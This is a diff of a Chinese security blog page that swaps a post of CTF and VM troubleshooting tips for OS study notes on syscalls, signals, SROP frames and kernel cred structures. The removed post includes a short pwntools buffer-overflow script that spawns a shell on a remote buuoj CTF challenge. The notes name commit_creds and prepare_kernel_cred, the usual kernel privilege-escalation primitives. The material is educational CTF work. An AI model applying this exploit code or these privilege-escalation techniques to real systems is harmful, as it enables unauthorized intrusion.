@@ -16,27 +16,28 @@
   <meta name="author" content="Isolator">
   <meta name="keywords" content="">
   
-    <meta name="description" content="解决或未解决的奇怪问题">
+    <meta name="description" content="操作系统补习">
 <meta property="og:type" content="article">
-<meta property="og:title" content="遇到的奇奇怪怪问题汇总">
-<meta property="og:url" content="https://isolator-1.github.io/2023/12/05/%E6%9D%82%E9%A1%B9/%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/index.html">
+<meta property="og:title" content="OS">
+<meta property="og:url" content="https://isolator-1.github.io/2023/12/13/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/OS/index.html">
 <meta property="og:site_name" content="Isolator&#39;s Blog">
-<meta property="og:description" content="解决或未解决的奇怪问题">
+<meta property="og:description" content="操作系统补习">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://isolator-1.github.io/img/problems/1.jpg">
-<meta property="article:published_time" content="2023-12-05T05:58:00.000Z">
-<meta property="article:modified_time" content="2023-12-05T06:08:36.755Z">
+<meta property="og:image" content="https://isolator-1.github.io/img/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/OS/1.jpg">
+<meta property="og:image" content="https://isolator-1.github.io/img/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/OS/2.jpg">
+<meta property="og:image" content="https://isolator-1.github.io/img/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/3.jpg">
+<meta property="article:published_time" content="2023-12-13T10:38:00.000Z">
+<meta property="article:modified_time" content="2023-12-13T12:45:27.318Z">
 <meta property="article:author" content="Isolator">
-<meta property="article:tag" content="ctf-pwn">
-<meta property="article:tag" content="Others">
+<meta property="article:tag" content="操作系统">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://isolator-1.github.io/img/problems/1.jpg">
+<meta name="twitter:image" content="https://isolator-1.github.io/img/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/OS/1.jpg">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>遇到的奇奇怪怪问题汇总 - Isolator&#39;s Blog</title>
+  <title>OS - Isolator&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -215,7 +216,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="遇到的奇奇怪怪问题汇总"></span>
+            <span id="subtitle" data-typed-text="OS"></span>
           
         </div>
 
@@ -226,8 +227,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-12-05 13:58" pubdate>
-          December 5, 2023 pm
+        <time datetime="2023-12-13 18:38" pubdate>
+          December 13, 2023 pm
         </time>
       </span>
     
@@ -238,7 +239,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.6k words
+          3.5k words
         
       </span>
     
@@ -249,7 +250,7 @@
         
         
         
-          14 mins
+          29 mins
         
       </span>
     
@@ -287,52 +288,68 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">遇到的奇奇怪怪问题汇总</h1>
+            <h1 style="display: none">OS</h1>
             
             
               <div class="markdown-body">
                 
-                <p><strong>vmware自带的vmtools安装了也复制不进来</strong></p>
-<p>虚拟机执行命令</p>
-<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">sudo apt-<span class="hljs-built_in">get</span> install <span class="hljs-keyword">open</span>-<span class="hljs-keyword">vm</span>-tools-desktop<br></code></pre></td></tr></table></figure>
+                <h2 id="控制流转移"><a href="#控制流转移" class="headerlink" title="控制流转移"></a>控制流转移</h2><h3 id="用户态到内核态"><a href="#用户态到内核态" class="headerlink" title="用户态到内核态"></a>用户态到内核态</h3><ol>
+<li><p>切换GS段寄存器</p>
+<p>swapgs指令，把GS段寄存器和某个特定位置的值进行交换，保存GS值，同时交换过来的值作为内核态的GS</p>
+</li>
+<li><p>保存用户栈帧信息</p>
+<p>把用户态栈顶记录在<code>CPU独占变量区域里</code>，再把CPU独占区域里记录内核栈顶放入rsp中</p>
+</li>
+<li><p>保存用户态寄存器信息</p>
+<p>把寄存器push到栈上形成一个pt_regs结构体</p>
+</li>
+<li><p>通过汇编指令判断是否为32位，将控制权交给内核</p>
+</li>
+</ol>
+<p>从内核态回到用户态时，依旧用swapgs指令切换GS寄存器，通过syretq或iretq指令让CPU模式回到ring 3，恢复用户态的状态</p>
+<h3 id="中断"><a href="#中断" class="headerlink" title="中断"></a>中断</h3><p>CPU停下工作，执行中断处理程序。</p>
+<p>实模式下，使用中断向量表（interrupt vector table）存放每个中断号对应的处理程序。保护模式引入中断描述符表IDT（Interrupt Descriptor Table）存放门描述符（gate descriptor），而这个IDT的地址存放在IDTR寄存器中。</p>
+<h4 id="门是什么"><a href="#门是什么" class="headerlink" title="门是什么"></a>门是什么</h4><p>gate会在中断前进行检查</p>
+<ol>
+<li>中断门（Interrupt Gate）处理硬中断，进入中断门后IF标志位会被清除，防止中断嵌套。并且中断门只能在内核态下访问（Descriptor Priviledge Level = 0）</li>
+<li>陷阱门（Trap Gate）处理CPU异常，但不会清空IF</li>
+<li>系统门（System Gate）系统调用（Descriptor Priviledge Level = 3）主要用于系统调用</li>
+</ol>
+<p><img src="/img/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/OS/1.jpg" srcset="/img/loading.gif" lazyload></p>
+<h3 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h3><blockquote>
+<p>32位的系统调用参数是ebx，ecx，edx，esi，edi，ebp</p>
+<p>64位还是和普通函数一样</p>
+</blockquote>
+<p>32位的时候，通过int 0x80触发一个软中断进入kernel mode，但是到了64位的时候有了syscall和sysenter指令，内核启动时会将系统调用函数入口（entry_SYSCALL_64）写入MSR寄存器组中，sycall时进入ring0并跳到MSR寄存器所指定的系统调用入口</p>
+<p>因此syscall性能是比int0x80高的</p>
+<p><img src="/img/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/OS/2.jpg" srcset="/img/loading.gif" lazyload></p>
+<h3 id="信号"><a href="#信号" class="headerlink" title="信号"></a>信号</h3><p>首先，一个进程收到信号，信号会被存储到进程描述符的信号队列中</p>
+<p>当进程被重新调度时，内核检查其信号队列，处理信号。内核会将用户态寄存器push到用户态栈上，形成sigcontext结构体，然后push SIGNALINFO以及指向sigreturn的代码。这些内容构成了<strong>SigreturnFrame</strong>（SROP伪造的就是这个结构体）</p>
+<p>接下来控制被返回到用户态进程，跳转到对应的signal handler函数，完成之后会执行sigreturn（也是一个系统调用）</p>
+<p>又进入了内核态，恢复原有的用户态上下文信息</p>
+<p>控制权返还用户态</p>
+<blockquote>
+<p>虽然信号不是及时处理的，但由于linux进程调度非常频繁，信号能很快被处理</p>
+</blockquote>
+<p><img src="/img/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/3.jpg" srcset="/img/loading.gif" lazyload></p>
+<h2 id="进程权限"><a href="#进程权限" class="headerlink" title="进程权限"></a>进程权限</h2><p>在linux kernel源码中，<code>include/linux/sched.h</code>中定义了taskt_struct结构体来描述进程，结构体中三个Process credentials描述了进程的权限</p>
+<ol>
+<li><code>ptracer_cred</code> 使用ptrace系统调用跟踪该进程的上级进程的cred（gdb的原理）如果提前占用这个位置就可以反调试</li>
+<li><code>real_cred</code> 客体凭证（objective cred）通常是一个进程启动时具有的权限</li>
+<li><code>cred</code> 主体凭证（subjective cred）该进程的有效cred，kernel以此作为进程权限的凭证</li>
+</ol>
+<p>这三个都是一个cred结构体的指针，在cred结构体中</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> &#123;</span><br>    <span class="hljs-type">atomic_t</span>    usage;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span><br>    <span class="hljs-type">atomic_t</span>    subscribers;    <span class="hljs-comment">/* number of processes subscribed */</span><br>    <span class="hljs-type">void</span>        *put_addr;<br>    <span class="hljs-type">unsigned</span>    magic;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CRED_MAGIC    0x43736564</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CRED_MAGIC_DEAD    0x44656144</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-type">kuid_t</span>        uid;        <span class="hljs-comment">/* real UID of the task */</span><br>    <span class="hljs-type">kgid_t</span>        gid;        <span class="hljs-comment">/* real GID of the task */</span><br>    <span class="hljs-type">kuid_t</span>        suid;        <span class="hljs-comment">/* saved UID of the task */</span><br>    <span class="hljs-type">kgid_t</span>        sgid;        <span class="hljs-comment">/* saved GID of the task */</span><br>    <span class="hljs-type">kuid_t</span>        euid;        <span class="hljs-comment">/* effective UID of the task */</span><br>    <span class="hljs-type">kgid_t</span>        egid;        <span class="hljs-comment">/* effective GID of the task */</span><br>    <span class="hljs-type">kuid_t</span>        fsuid;        <span class="hljs-comment">/* UID for VFS ops */</span><br>    <span class="hljs-type">kgid_t</span>        fsgid;        <span class="hljs-comment">/* GID for VFS ops */</span><br>    <span class="hljs-type">unsigned</span>    securebits;    <span class="hljs-comment">/* SUID-less security management */</span><br>    <span class="hljs-type">kernel_cap_t</span>    cap_inheritable; <span class="hljs-comment">/* caps our children can inherit */</span><br>    <span class="hljs-type">kernel_cap_t</span>    cap_permitted;    <span class="hljs-comment">/* caps we&#x27;re permitted */</span><br>    <span class="hljs-type">kernel_cap_t</span>    cap_effective;    <span class="hljs-comment">/* caps we can actually use */</span><br>    <span class="hljs-type">kernel_cap_t</span>    cap_bset;    <span class="hljs-comment">/* capability bounding set */</span><br>    <span class="hljs-type">kernel_cap_t</span>    cap_ambient;    <span class="hljs-comment">/* Ambient capability set */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_KEYS</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>    jit_keyring;    <span class="hljs-comment">/* default keyring to attach requested</span><br><span class="hljs-comment">                     * keys to */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">key</span>    *<span class="hljs-title">session_keyring</span>;</span> <span class="hljs-comment">/* keyring inherited over fork */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">key</span>    *<span class="hljs-title">process_keyring</span>;</span> <span class="hljs-comment">/* keyring private to this process */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">key</span>    *<span class="hljs-title">thread_keyring</span>;</span> <span class="hljs-comment">/* keyring private to this thread */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">key</span>    *<span class="hljs-title">request_key_auth</span>;</span> <span class="hljs-comment">/* assumed request_key authority */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SECURITY</span><br>    <span class="hljs-type">void</span>        *security;    <span class="hljs-comment">/* subjective LSM security */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_struct</span> *<span class="hljs-title">user</span>;</span>    <span class="hljs-comment">/* real user ID subscription */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_namespace</span> *<span class="hljs-title">user_ns</span>;</span> <span class="hljs-comment">/* user_ns the caps and keyrings are relative to. */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">group_info</span> *<span class="hljs-title">group_info</span>;</span>    <span class="hljs-comment">/* supplementary groups for euid/fsgid */</span><br>    <span class="hljs-comment">/* RCU deletion */</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        <span class="hljs-type">int</span> non_rcu;            <span class="hljs-comment">/* Can we skip RCU deletion? */</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rcu_head</span>    <span class="hljs-title">rcu</span>;</span>        <span class="hljs-comment">/* RCU deletion hook */</span><br>    &#125;;<br>&#125; __randomize_layout;<br></code></pre></td></tr></table></figure>
 
-<p>如果拖放文件的时候出现了</p>
-<p><img src="/img/problems/1.jpg" srcset="/img/loading.gif" lazyload></p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo gedit <span class="hljs-regexp">/etc/g</span>dm3/custom.conf<br></code></pre></td></tr></table></figure>
+<p>copy过来的，但不是很理解（</p>
+<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs objectivec">一个cred结构体中记载了一个进程四种不同的用户ID：<br><br>真实用户ID（real <span class="hljs-built_in">UID</span>）：标识一个进程启动时的用户ID<br>保存用户ID（saved <span class="hljs-built_in">UID</span>）：标识一个进程最初的有效用户ID<br>有效用户ID（effective <span class="hljs-built_in">UID</span>）：标识一个进程正在运行时所属的用户ID，一个进程在运行途中是可以改变自己所属用户的，因而权限机制也是通过有效用户ID进行认证的，内核通过 euid 来进行特权判断；为了防止用户一直使用高权限，当任务完成之后，euid 会与 suid 进行交换，恢复进程的有效权限<br>文件系统用户ID（<span class="hljs-built_in">UID</span> <span class="hljs-keyword">for</span> VFS ops）：标识一个进程创建文件时进行标识的用户ID<br>在通常情况下这几个ID应当都是相同的<br><br>用户组ID同样分为四个：真实组ID、保存组ID、有效组ID、文件系统组ID<br></code></pre></td></tr></table></figure>
 
-<p>将<code>WaylandEnable=false</code>注释掉</p>
-<p>据说是vmware还没有支持ubutnu22.04的默认桌面Wayland</p>
-<h4 id="sleep-？"><a href="#sleep-？" class="headerlink" title="sleep ？"></a>sleep ？</h4><p>题目：</p>
-<p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#mrctf2020_easyrop">https://buuoj.cn/challenges#mrctf2020_easyrop</a></p>
-<p>本来是很简单的一个溢出</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><span class="hljs-comment">#r = process(&#x27;./mrctf2020_easyrop&#x27;)</span><br>r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25663</span>)<br>system_sh =<span class="hljs-number">0x000000000040072A</span><br>r.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br><span class="hljs-comment">#sleep(1)</span><br>r.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x300</span>)<br>r.sendline(<span class="hljs-string">b&#x27;7&#x27;</span>)<br><span class="hljs-comment">#sleep(1)</span><br>r.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>* <span class="hljs-number">0x12</span> + p64(system_sh))<br>r.interactive()<br></code></pre></td></tr></table></figure>
-
-<p>但是不加sleep无法通过</p>
-<p>有人说是python同时发送多个字符串时会合并(?)</p>
-<p>那什么时候情况下需要在sendline前面加一个sleep</p>
-<p>​    [已解决] 打本地不加应该没事，打远程的时候肯定会有一点延迟，假如没有sendafter这一类的发送，就可能会造成后面的也一起发送了，所以每次写exp发送的时候最好用sendafter或者sendlineafter这样的话就不需要再担心sleep(1)了</p>
-<hr>
-<h4 id="binwalk提取固件时快捷方式指向-dev-null"><a href="#binwalk提取固件时快捷方式指向-dev-null" class="headerlink" title="binwalk提取固件时快捷方式指向/dev/null"></a>binwalk提取固件时快捷方式指向/dev/null</h4><p>binwalk提取固件时会有一个warning</p>
-<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">WARNING: Symlink points outside of the extraction directory: <span class="hljs-regexp">/home/</span>kali<span class="hljs-regexp">/Desktop/</span>dir815_FW_101<span class="hljs-regexp">/_DIR-815 FW 1.01b14_1.01b14.bin.extracted/</span>squashfs-root<span class="hljs-regexp">/htdocs/</span>web<span class="hljs-regexp">/dlcfg.cgi -&gt; /</span>htdocs<span class="hljs-regexp">/cgibin; changing link target to /</span>dev/<span class="hljs-keyword">null</span> <span class="hljs-keyword">for</span> security purposes.<br></code></pre></td></tr></table></figure>
-
-<p>用到这个快捷方式时要修改一下</p>
-<h4 id="sendlineafter的问题"><a href="#sendlineafter的问题" class="headerlink" title="sendlineafter的问题"></a>sendlineafter的问题</h4><p>要加上换行符<code>\n</code>，否则匹配不上</p>
-<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.sendlineafter</span>(b<span class="hljs-string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>,...)<br></code></pre></td></tr></table></figure>
-
-
-
-<h4 id="python调用c库函数"><a href="#python调用c库函数" class="headerlink" title="python调用c库函数"></a>python调用c库函数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br>libc = cdll.LoadLibrary(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>libc.srand(<span class="hljs-number">0</span>)<br>libc.rand()%<span class="hljs-number">6</span> + <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
-
-
-
-<h4 id="安装ubuntu18，pwndbg安装不上（setup-sh总有问题）"><a href="#安装ubuntu18，pwndbg安装不上（setup-sh总有问题）" class="headerlink" title="安装ubuntu18，pwndbg安装不上（setup.sh总有问题）"></a>安装ubuntu18，pwndbg安装不上（setup.sh总有问题）</h4><p>选择用pwndbg release的安装包，安装之后把<code>/usr/bin/gdb</code>给改成<code>/usr/ bin/pwndbg</code>的软连接</p>
-<p>然后在调用<code>gdb.attach</code>时弹不出来新的窗口：</p>
-<p>采用tmux解决，安装tmux后，程序开头加上一句话</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;splitw&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>]<br></code></pre></td></tr></table></figure>
-
-<p>然后再命令行先运行sudo tmux，然后运行exp.py，就可以弹出来gdb了。</p>
-<p>然后发现无法滚动鼠标，使用<code>ctrl + shift + b + :</code>进入命令模式，输入<code>set -g mouse on</code></p>
-<p>就可以滚动终端了</p>
+<h3 id="进程权限改变"><a href="#进程权限改变" class="headerlink" title="进程权限改变"></a>进程权限改变</h3><p>kernel/cred.c中</p>
+<p><code>cred* prepare_kernel_cred(struct task_struct* daemon)</code>可以拷贝一个进程的cred进程的结构体，返回一个新的结构体</p>
+<p><code>int commit_creds(struct cred *new)</code>将一个新的cred结构体应用到进程</p>
+<h2 id="LKMs"><a href="#LKMs" class="headerlink" title="LKMs"></a>LKMs</h2><p>Loadable Kernel Modules</p>
+<p>lsmod查看所有的LKMs</p>
+<p>insmod/remod 装载/溢出LKM</p>
 
                 
               </div>
@@ -351,7 +368,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/%E6%9D%82%E9%A1%B9/" class="category-chain-item">杂项</a>
+  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="category-chain-item">学习笔记</a>
   
   
 
@@ -366,9 +383,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/ctf-pwn/">#ctf-pwn</a>
-      
-        <a href="/tags/Others/">#Others</a>
+        <a href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">#操作系统</a>
       
     </div>
   
@@ -380,8 +395,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>遇到的奇奇怪怪问题汇总</div>
-      <div>https://isolator-1.github.io/2023/12/05/杂项/遇到的奇奇怪怪问题汇总/</div>
+      <div>OS</div>
+      <div>https://isolator-1.github.io/2023/12/13/学习笔记/OS/</div>
     </div>
     <div class="license-meta">
       
@@ -393,7 +408,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>Posted on</div>
-          <div>December 5, 2023</div>
+          <div>December 13, 2023</div>
         </div>
       
       
@@ -425,18 +440,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/12/06/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/mit6858Lab1/" title="mit6858 Lab1">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">mit6858 Lab1</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/12/01/ctf-pwn/tcache%20attack/" title="tcache attack">
-                        <span class="hidden-mobile">tcache attack</span>
+                      <a href="/2023/12/13/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%B9%B1%E4%B8%83%E5%85%AB%E7%B3%9F%E7%9A%84%E7%9F%A5%E8%AF%86/" title="乱七八糟的知识">
+                        <span class="hidden-mobile">乱七八糟的知识</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
